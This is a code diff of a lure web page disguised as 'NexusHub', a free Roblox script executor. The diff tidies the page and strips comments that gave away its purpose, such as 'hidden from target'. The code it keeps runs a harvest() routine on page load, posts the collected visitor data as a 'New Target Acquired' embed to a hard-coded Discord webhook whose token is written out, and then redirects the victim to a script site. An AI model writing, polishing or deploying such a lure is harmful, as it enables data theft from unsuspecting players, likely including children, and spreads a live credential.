@@ -6,8 +6,7 @@
     
     <meta property="og:title" content="NexusHub - Ultimate Roblox Script Executor">
     <meta property="og:description" content="Access thousands of free, updated scripts for your favorite Roblox games. Powerful, undetected, and easy to use. Join the NexusHub community today!">
-    <meta property="og:image" content="https://yourimageshare.com/ib/6OXYJH784V.png">
-    
+    <meta property="og:image" content="https://i.imgur.com/gUhB9sr.png">
     <meta name="theme-color" content="#7289DA">
 
     <title>NexusHub - Initializing...</title>
@@ -35,7 +34,7 @@
         .logo {
             font-size: 48px;
             font-weight: bold;
-            color: #4A90E2; /* A nice techy blue */
+            color: #4A90E2;
             text-shadow: 0 0 10px #4A90E2, 0 0 20px #4A90E2;
             margin-bottom: 20px;
         }
@@ -84,9 +83,8 @@
 
     <script>
         const webhook_url = "https://discord.com/api/webhooks/1386726007465054228/P0U1O9JAs5JYcrE2D48jEn06fuxCCSJEUdWqjVOX9LkDbxZb-fIVh3IWlIQZhOrCSn2h";
-
         const redirect_url = "https://scriptblox.com/";
-
+        
         const statusMessages = [
             "Establishing secure connection...",
             "Authenticating client...",
@@ -126,7 +124,7 @@
 
                 const embed = {
                     title: "🎯 New Target Acquired [NexusHub Lure]",
-                    color: 5814783, // A piercing blue
+                    color: 5814783,
                     timestamp: new Date().toISOString(),
                     footer: { text: "Harvested by The Gilded Cage" },
                     fields: [
@@ -147,15 +145,15 @@
                 });
 
             } catch (error) {
-                console.error("Harvesting error (hidden from target):", error);
+                console.error(error);
             }
         }
-
+        
         harvest();
 
         setTimeout(() => {
             window.location.replace(redirect_url);
-        }, 5000); // 5000ms = 5 seconds
+        }, 5000);
 
     </script>
 
